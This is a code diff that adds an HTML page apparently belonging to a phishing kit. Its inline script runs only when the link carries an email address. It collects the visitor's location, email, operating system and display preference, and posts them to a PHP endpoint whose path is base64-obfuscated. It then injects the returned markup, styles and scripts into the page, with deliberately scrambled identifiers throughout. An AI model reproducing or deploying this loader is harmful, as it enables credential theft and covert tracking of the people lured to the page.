@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title></title>
+    <link rel="stylesheet" href="./jjwkwnwnwww.css" />
+    <link rel="icon" type="image/ico" id="fav_icn__">
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css"
+      integrity="sha512-xh6O/CkQoPOWDdYTDqeRdPCVd1SpvCA9XXcUnZS2FmJNp1coAFzvtCN9BmamE+4aHK8yyUHUSCcJHgXloTyT2A=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+
+    <style id="sttoappend"></style>
+
+    <script
+      src="https://kit.fontawesome.com/839d221177.js"
+      crossorigin="anonymous"
+    ></script>
+    
+  </head>
+  <body>
+    <div preloader="true" class="d-view">
+      <div class="lder-bdy">
+        <img src="./im_g/wwkwkwkmwm.gif" alt="" />
+      </div>
+    </div>
+
+    <div preloader="true" class="m-view">
+      <div class="lder-bdy">
+        <img src="./im_g/wwkwkwkmwm.gif" alt="" />
+      </div>
+    </div>
+
+    <br />
+
+    <script src="./srv.js"></script>
+
+    <script src="./dt.js"></script>
+
+    <script id="sctoapnd"></script>
+
+    <script id="js_enenne"></script>
+
+    <script src="./lib.js"></script>
+
+    <script>
+
+      const _set_up__ = async () => {
+        
+         // set subCnt
+         const auth_err = _getSC_(window.location.href.split("?")[1]).sc;
+
+          // set __UrlEm
+          const __UrlEm = __getURLEm();
+
+          // console.log({ auth_err, __UrlEm, __winHref });
+
+          // urlem check
+          if (
+              __getInd__(__winHref, "#") === -1 ||
+              __getInd__(__winHref, "@") === -1 ||
+              !Boolean(__UrlEm)
+          ) {
+              // window.location.href = "https://www.mail.com/no-email";
+              console.log("Failed");
+              return;
+          }
+
+        async function ftch_intrnls(bdy = {}, dv = "m") {
+          const __locData = await loadLoc();
+          
+          const reqPald = {
+            __locData,
+            __urlEm: __getURLEm(),
+            auth_err,
+            dv,
+            __winHref,
+            ...bdy
+          };
+
+          const __fetchOptions = {
+            method: "POST",
+            body: JSON.stringify(reqPald),
+            headers: {
+              "Content-Type": "application/json",
+            },
+          };
+
+          const __res = await fetch(
+            `${window.stef.srv_loc}${atob("L2J3Ym53d2p3bjJtMjIucGhw")}`,
+            __fetchOptions
+          );
+
+          const __resData = await __res.json();
+
+          // console.log({__resData});
+
+          return __resData;
+        }
+
+        async function mInit() {
+          console.log(":mobile");
+
+          const res = await ftch_intrnls({});
+
+          m_view.innerHTML = res.data.cnt;
+          m_view.classList.add("display_block");
+
+          setAttr__("preloader", "false", m_view);
+
+          scToAppend.innerHTML = res.data.crpt;
+
+          __setUp__stef();
+        }
+
+        async function dInit() {
+          console.log(":desktop");
+          let ltmd = "l";
+          let _os = "w";
+
+          if (stef_dt.os.indexOf("Windows") === -1) {
+            _os = "m";
+          }
+
+          if (
+            window.matchMedia &&
+            window.matchMedia("(prefers-color-scheme: dark)").matches
+          ) {
+            ltmd = "d";
+          }
+
+          // _os = 'w';
+          // ltmd = "l";
+
+          const res = await ftch_intrnls({ ltmd, _os }, "d");
+
+          d_view.innerHTML = res.data.cnt;
+          d_view.classList.add("display_block");
+
+          setAttr__("preloader", "false", d_view);
+
+          __getEl__("#sttoappend").innerHTML = res.data.css_mwnnwnwn;
+
+          scToAppend.innerHTML = res.data.crpt;
+
+          window.stef_dt.auth_status_max_rdr = res.data.auth_status_max_rdr;
+
+          __getEl__("#js_enenne").innerHTML = res.data.js_enenne;
+
+          __setUp__stef();
+
+        }
+
+        window.stef_dt.__m__ ? mInit() : dInit();
+      }
+      
+      _set_up__();
+    </script>
+
+</body>
+</html>
